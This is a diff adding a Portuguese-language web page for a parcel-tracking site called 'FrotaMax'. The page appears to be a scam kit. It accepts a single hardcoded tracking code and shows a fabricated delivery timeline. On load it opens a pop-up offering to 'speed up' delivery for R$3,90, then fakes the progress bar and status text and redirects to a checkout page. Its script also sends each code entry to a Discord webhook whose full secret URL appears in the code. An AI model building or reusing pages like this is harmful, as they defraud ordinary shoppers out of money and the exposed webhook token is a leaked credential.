@@ -1,0 +1,695 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+<title>Baixar App - FrotaMax</title>
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<link rel="icon" type="image/x-icon" href="https://cdn-icons-png.flaticon.com/512/2066/2066642.png">
+
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
+
+:root{
+  --primary:#f7ac13;
+  --dark:#0d2235;
+  --light:#f5f7fa;
+}
+
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+}
+
+body{
+  font-family:'Inter',sans-serif;
+  background:white;
+  color:#111;
+}
+
+/* ===== BASE ===== */
+
+.container{
+  max-width:1100px;
+  margin:auto;
+  padding:0 20px;
+}
+
+.section{
+  padding:20px 0;
+}
+
+.btn{
+  display:inline-flex;
+  align-items:center;
+  gap:12px;
+  padding:16px 30px;
+  border-radius:14px;
+  font-weight:600;
+  text-decoration:none;
+  transition:.3s;
+  cursor:pointer;
+  border:none;
+}
+
+.btn-primary{
+  background:var(--primary);
+  color:black;
+  font-size:18px;
+}
+
+.btn-primary:hover{
+  transform:translateY(-3px);
+}
+
+.btn-secondary{
+  background:#e0e0e0;
+  color:#333;
+  font-size:18px;
+}
+
+.btn-secondary:hover{
+  background:#d0d0d0;
+  transform:translateY(-3px);
+}
+
+.card{
+  background:white;
+  border-radius:20px;
+  padding:30px;
+  box-shadow:0 15px 30px rgba(0,0,0,.06);
+}
+
+/* ===== HEADER ===== */
+
+header{
+  background:#e6e6e6;
+  color:white;
+  height:220px; /* Aumentado para acomodar a logo maior */
+  display:flex;
+  align-items:center;
+  padding: 20px 0; /* Adicionado espaçamento interno */
+}
+
+/* Estilos para a logo */
+.logo {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  width: 100%; /* Ocupa toda largura do header */
+  padding: 10px 0; /* Adicionado padding vertical */
+}
+
+.logo img {
+  height: 150px; /* Altura fixa para a logo */
+  width: auto; /* Largura automática para manter proporção */
+  max-width: 100%; /* Garante que não ultrapasse o container */
+}
+
+/* ===== HERO ===== */
+
+.hero{
+  background:linear-gradient(135deg,var(--dark),#132c46);
+  color:white;
+  text-align:center;
+  padding:30px 20px 10px;
+}
+
+.hero h1{
+  font-size:42px;
+  font-weight:800;
+  margin-bottom:20px;
+}
+
+.hero span{
+  color:var(--primary);
+}
+
+.hero p{
+  font-size:18px;
+  max-width:650px;
+  margin:auto;
+  opacity:.9;
+}
+
+/* ===== BENEFITS ===== */
+
+.grid{
+  display:grid;
+  grid-template-columns:repeat(3,1fr);
+  gap:30px;
+  margin-top:50px;
+}
+
+.icon{
+  width:60px;
+  height:60px;
+  background:var(--primary);
+  border-radius:14px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:22px;
+  color:black;
+  margin-bottom:18px;
+}
+
+/* ===== DOWNLOAD SECTION ===== */
+
+.download{
+  text-align:center;
+  background:var(--light);
+}
+
+/* Estilos para o campo de input */
+.tracking-input {
+  width: 100%;
+  max-width: 400px;
+  padding: 15px;
+  border: 2px solid #ddd;
+  border-radius: 10px;
+  font-size: 16px;
+  margin-bottom: 20px;
+  transition: border-color 0.3s;
+}
+
+.tracking-input:focus {
+  border-color: var(--primary);
+  outline: none;
+}
+
+/* Estilos para o rastreamento */
+.tracking-container {
+  display: none;
+  margin-top: 30px;
+  background: white;
+  border-radius: 20px;
+  padding: 30px;
+  box-shadow: 0 15px 30px rgba(0,0,0,.06);
+  max-width: 800px;
+  margin-left: auto;
+  margin-right: auto;
+}
+
+.tracking-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-bottom: 25px;
+  padding-bottom: 15px;
+  border-bottom: 1px solid #eee;
+}
+
+.tracking-title {
+  font-size: 24px;
+  font-weight: 600;
+  color: var(--dark);
+}
+
+.tracking-code {
+  font-size: 16px;
+  color: #666;
+}
+
+.tracking-timeline {
+  position: relative;
+  padding-left: 40px;
+}
+
+.tracking-timeline::before {
+  content: '';
+  position: absolute;
+  left: 15px;
+  top: 0;
+  height: 100%;
+  width: 4px;
+  background: #e0e0e0;
+  border-radius: 2px;
+}
+
+.tracking-item {
+  position: relative;
+  margin-bottom: 25px;
+}
+
+.tracking-item:last-child {
+  margin-bottom: 0;
+}
+
+.tracking-item::before {
+  content: '';
+  position: absolute;
+  left: -25px;
+  top: 5px;
+  width: 14px;
+  height: 14px;
+  border-radius: 50%;
+  background: #e0e0e0;
+  z-index: 1;
+}
+
+.tracking-item.active::before {
+  background: var(--primary);
+  box-shadow: 0 0 0 4px rgba(247, 172, 19, 0.2);
+}
+
+.tracking-item.completed::before {
+  background: #4caf50;
+  box-shadow: 0 0 0 4px rgba(76, 175, 80, 0.2);
+}
+
+.tracking-date {
+  font-size: 14px;
+  color: #888;
+  margin-bottom: 5px;
+}
+
+.tracking-status {
+  font-size: 18px;
+  font-weight: 600;
+  color: #333;
+  margin-bottom: 5px;
+}
+
+.tracking-location {
+  font-size: 16px;
+  color: #666;
+}
+
+.tracking-arrow {
+  color: var(--primary);
+  margin: 10px 0;
+  text-align: center;
+}
+
+.tracking-arrow i {
+  font-size: 24px;
+}
+
+.tracking-progress {
+  margin-top: 30px;
+  background: #f5f5f5;
+  border-radius: 10px;
+  padding: 15px;
+}
+
+.tracking-progress-bar {
+  height: 8px;
+  background: #e0e0e0;
+  border-radius: 4px;
+  overflow: hidden;
+  margin-bottom: 10px;
+}
+
+.tracking-progress-fill {
+  height: 100%;
+  width: 7%;
+  background: var(--primary);
+  border-radius: 4px;
+}
+
+.tracking-progress-text {
+  display: flex;
+  justify-content: space-between;
+  font-size: 14px;
+  color: #666;
+}
+
+.tracking-note {
+  margin-top: 20px;
+  padding: 15px;
+  background: #fff9e6;
+  border-radius: 10px;
+  border-left: 4px solid var(--primary);
+}
+
+.tracking-note p {
+  font-size: 16px;
+  color: #666;
+}
+
+/* Estilos para o modal */
+.modal {
+  display: none;
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-color: rgba(0, 0, 0, 0.7);
+  z-index: 1000;
+  justify-content: center;
+  align-items: center;
+}
+
+.modal-content {
+  background-color: white;
+  padding: 30px;
+  border-radius: 20px;
+  max-width: 500px;
+  width: 90%;
+  text-align: center;
+  box-shadow: 0 15px 30px rgba(0,0,0,.2);
+  animation: modalFadeIn 0.3s ease-out;
+}
+
+@keyframes modalFadeIn {
+  from {
+    opacity: 0;
+    transform: translateY(-20px);
+  }
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
+}
+
+.modal-close {
+  position: absolute;
+  top: 15px;
+  right: 15px;
+  font-size: 24px;
+  cursor: pointer;
+  color: #999;
+}
+
+.modal-close:hover {
+  color: #333;
+}
+
+.modal-icon {
+  font-size: 48px;
+  color: var(--primary);
+  margin-bottom: 20px;
+}
+
+.modal h2 {
+  margin-bottom: 15px;
+  color: var(--dark);
+}
+
+.modal p {
+  margin-bottom: 25px;
+  color: #666;
+  line-height: 1.5;
+}
+
+.modal-buttons {
+  display: flex;
+  gap: 15px;
+  justify-content: center;
+  flex-wrap: wrap;
+}
+
+.modal-buttons .btn {
+  flex: 1;
+  min-width: 150px;
+}
+
+/* ===== FOOTER ===== */
+
+footer{
+  background:var(--dark);
+  color:#aaa;
+  text-align:center;
+  padding:45px 0;
+}
+
+/* ===== RESPONSIVO ===== */
+
+@media(max-width:900px){
+  .grid{
+    grid-template-columns:1fr;
+  }
+
+  .hero h1{
+    font-size:32px;
+  }
+  
+  header {
+    height: 160px; /* Reduzido para telas menores */
+  }
+  
+  .logo img {
+    height: 140px; /* Reduzido para telas menores */
+  }
+  
+  .download-btn {
+    border: none;        /* remove borda preta */
+    outline: none;       /* remove contorno ao focar */
+    box-shadow: none;    /* remove sombra */
+  }
+  
+  .tracking-container {
+    padding: 20px;
+  }
+  
+  .tracking-header {
+    flex-direction: column;
+    align-items: flex-start;
+    gap: 10px;
+  }
+  
+  .modal-buttons {
+    flex-direction: column;
+  }
+  
+  .modal-buttons .btn {
+    width: 100%;
+  }
+  
+  /* Estiliza o link dentro da tracking-note */
+.tracking-note a {
+  display: block; /* Faz o link ocupar toda a linha, como um parágrafo */
+  font-size: 16px;
+  color: #666; /* Mantém a cor do texto original */
+  text-decoration: none; /* Remove o sublinhado padrão do link */
+  cursor: pointer; /* Muda o cursor para uma mão ao passar o mouse */
+  transition: color 0.3s ease; /* Adiciona uma transição suave na mudança de cor */
+}
+
+/* Efeito ao passar o mouse sobre o link (opcional, mas recomendado) */
+.tracking-note a:hover {
+  color: var(--primary); /* Muda a cor para a amarela da marca no hover */
+  text-decoration: underline; /* Opcional: adiciona sublinhado no hover para mais feedback */
+}
+}
+</style>
+</head>
+
+<body>
+
+<!-- HEADER -->
+<header>
+  <div class="logo">
+    <img src="https://i.ibb.co/hJMtB6k2/logo-cut.jpg" alt="Logo FrotaMax">
+  </div>
+</header>
+
+
+<!-- HERO -->
+<section class="hero">
+
+  <h1>
+    Rastreie seu pedido em <span>tempo real</span>
+  </h1>
+
+</section>
+
+<!-- DOWNLOAD -->
+<section class="section download">
+  <div class="container">
+    <h2 style="font-size:34px;margin-bottom:10px;">
+      Insira seu código de rastreamento
+    </h2>
+
+    <p style="margin-bottom:30px;">
+      Digite o código de rastreamento para verificar o status da sua entrega.
+    </p>  
+
+    <!-- CAMPO DE INPUT PARA CÓDIGO DE RASTREIO -->
+    <input type="text" id="trackingCode" class="tracking-input" placeholder="Digite seu código de rastreamento">
+    
+    <!-- BOTÃO PARA VERIFICAR CÓDIGO -->
+    <button class="btn btn-primary" onclick="verificarCodigo()">
+      <i class="fas fa-search"></i>
+      Rastrear
+    </button>
+
+    <!-- CONTAINER DE RASTREAMENTO (INICIALMENTE OCULTO) -->
+    <div id="trackingContainer" class="tracking-container">
+      <div class="tracking-header">
+        <h3 class="tracking-title">Status da Entrega</h3>
+        <div class="tracking-code">Código: <span id="codigoExibido"></span></div>
+      </div>
+      
+      <div class="tracking-timeline">
+        <div class="tracking-item completed">
+          <div class="tracking-date">20/02/2026 - 14:30</div>
+          <div class="tracking-status">Pedido confirmado</div>
+          <div class="tracking-location">Florianópolis, SC</div>
+        </div>
+        
+        <div class="tracking-arrow">
+          <i class="fas fa-arrow-down"></i>
+        </div>
+        
+        <div class="tracking-item active">
+          <div class="tracking-date">21/02/2026 - 09:15</div>
+          <div class="tracking-status">Coletado no ponto</div>
+          <div class="tracking-location">Centro de Distribuição – São José, SC</div>
+        </div>       
+      
+      <div class="tracking-progress">
+        <div class="tracking-progress-bar">
+          <div class="tracking-progress-fill"></div>
+        </div>
+        <div class="tracking-progress-text">
+          <span>7% concluído</span>
+          <!-- <span>Previsão de entrega: 18/05/2023</span> -->
+        </div>
+      </div>
+      
+      <div class="tracking-note">
+  <a href="checkout.html">
+    <i class="fas fa-info-circle"></i> Acelere seu pedido clicando aqui
+  </a>
+</div>
+    </div>
+
+  </div>
+</section>
+
+
+<!-- FOOTER -->
+<footer>
+  © 2026 FrotaMax • Todos os direitos reservados
+</footer>
+
+<!-- MODAL -->
+<div id="trackingModal" class="modal">
+  <div class="modal-content">
+    <span class="modal-close" onclick="fecharModal()">&times;</span>
+    <div class="modal-icon">
+      <i class="fas fa-truck-fast"></i>
+    </div>
+    <h2>Acelere sua entrega</h2>
+    <p> 🚀 Acelere sua entrega por apenas R$ 3,90! Em vez de esperar pelo transporte em caminhão, sua carga será levada por uma van exclusiva, garantindo mais agilidade e prioridade no trajeto. </p>
+    <div class="modal-buttons">
+      <button class="btn btn-primary" onclick="comprarPlanoRapido()">
+        <i class="fas fa-bolt"></i>
+        Acelerar por R$3,90
+      </button>
+      <button class="btn btn-secondary" onclick="manterEntregaNormal()">
+        <i class="fas fa-clock"></i>
+        Manter entrega normal
+      </button>
+    </div>
+  </div>
+</div>
+
+
+<script>
+  // Código de rastreamento válido para teste
+  const CODIGO_VALIDO = "BRJLD53447E6Y";
+  
+  function verificarCodigo() {
+  const codigoInserido = document.getElementById('trackingCode').value.trim().toUpperCase();
+
+  if (codigoInserido === CODIGO_VALIDO) {
+    // Envia webhook para o Discord
+    fetch("https://discord.com/api/webhooks/1468746875363524700/trfIFrx5LSPlzLoHbUjlZPmlVjqEhdzk6tkLdpvYUczeNpXa3xyRJDCuiIof6Qex9Wa5", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        content: `🔎App: Clicou em rastreamento com o código: ${codigoInserido}`
+      })
+    })
+    .then(response => {
+      if (!response.ok) {
+        console.error("Erro ao enviar webhook:", response.statusText);
+      }
+    })
+    .catch(error => console.error("Erro de rede:", error));
+
+    // Exibe o container de rastreamento se o código for válido
+    document.getElementById('trackingContainer').style.display = 'block';
+    document.getElementById('codigoExibido').textContent = codigoInserido;
+
+    // Rolagem suave para o container de rastreamento
+    document.getElementById('trackingContainer').scrollIntoView({ 
+      behavior: 'smooth',
+      block: 'start'
+    });
+  } else if (codigoInserido === '') {
+    // Exibe mensagem de erro se o campo estiver vazio
+    document.getElementById('trackingCode').style.borderColor = '#ff4d4d';
+    document.getElementById('trackingCode').placeholder = 'Por favor, insira um código de rastreamento';
+  } else {
+    // Exibe mensagem de erro se o código for inválido
+    document.getElementById('trackingCode').style.borderColor = '#ff4d4d';
+    document.getElementById('trackingCode').value = '';
+    document.getElementById('trackingCode').placeholder = 'Código inválido. Tente novamente.';
+  }
+}
+  
+  function fecharModal() {
+    document.getElementById('trackingModal').style.display = 'none';
+  }
+  
+function comprarPlanoRapido() {
+    // Atualiza a barra de progresso para refletir a entrega acelerada
+    document.querySelector('.tracking-progress-fill').style.width = '70%';
+    document.querySelector('.tracking-progress-text span:first-child').textContent = '70% concluído';
+    document.querySelector('.tracking-progress-text span:last-child').textContent = 'Previsão de entrega: 16/05/2023 (antecipada)';
+    
+    // Fecha o modal
+    fecharModal();
+    
+    // Atualiza o status do rastreamento para refletir a entrega acelerada
+    const activeItem = document.querySelector('.tracking-item.active');
+    if (activeItem) {
+      activeItem.querySelector('.tracking-status').textContent = 'Transporte acelerado por van';
+      activeItem.querySelector('.tracking-location').textContent = 'Em trânsito acelerado para Rio de Janeiro, RJ';
+    }
+    
+    // Adiciona um pequeno atraso antes do redirecionamento (1 segundo)
+    setTimeout(function() {
+        // Redireciona para a página de checkout na mesma aba
+        window.location.href = 'checkout.html';
+    }, 1000);
+}
+  
+  function manterEntregaNormal() {
+    // Simulação de manutenção da entrega normal
+    //alert('Entrega normal mantida. Sua carga continuará sendo transportada por caminhão conforme planejado.');
+    
+    // Fecha o modal
+    fecharModal();
+  }
+  
+  // Exibir o modal quando a página carregar
+  window.onload = function() {
+    document.getElementById('trackingModal').style.display = 'flex';
+  };
+  
+  // Adiciona evento para limpar o estilo de erro quando o usuário começar a digitar
+  document.getElementById('trackingCode').addEventListener('input', function() {
+    this.style.borderColor = '#ddd';
+    this.placeholder = 'Digite seu código de rastreamento';
+  });
+  
+  // Adiciona evento para permitir verificar o código ao pressionar Enter
+  document.getElementById('trackingCode').addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') {
+      verificarCodigo();
+    }
+  });
+</script>
+</body>
+</html>
